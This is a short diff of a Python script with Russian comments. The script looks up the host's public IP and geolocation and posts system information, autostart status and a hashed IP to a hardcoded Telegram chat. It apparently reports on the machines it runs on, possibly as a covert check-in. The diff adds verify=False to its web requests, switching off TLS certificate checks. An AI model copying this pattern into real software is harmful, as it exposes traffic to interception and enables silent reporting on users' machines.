@@ -32,7 +32,7 @@ chat_id = '-1002252120859'
 # Функция для получения публичного IP
 def get_public_ip():
     try:
-        response = requests.get('https://api64.ipify.org?format=json')
+        response = requests.get('https://api64.ipify.org?format=json', verify=False)
         if response.status_code == 200:
             return response.json().get('ip')
         else:
@@ -44,7 +44,7 @@ def get_public_ip():
 # Функция для получения геолокации по IP
 def get_ip_geolocation(ip):
     try:
-        response = requests.get(f'https://ipinfo.io/{ip}/json')
+        response = requests.get(f'https://ipinfo.io/{ip}/json', verify=False)
         if response.status_code == 200:
             data = response.json()
             return data.get('country', 'Unknown'), data.get('city', 'Unknown')
@@ -210,10 +210,9 @@ if __name__ == '__main__':
         
         📊 **System Information:**
         {system_info}
-
-        🔐 **Hashed IP**: #{hashed_ip}
         
         🚀 **Autostart Status**: {autostart_status_icon}
+        #{hashed_ip}
         """
 
         # Отправляем первое сообщение в Telegram
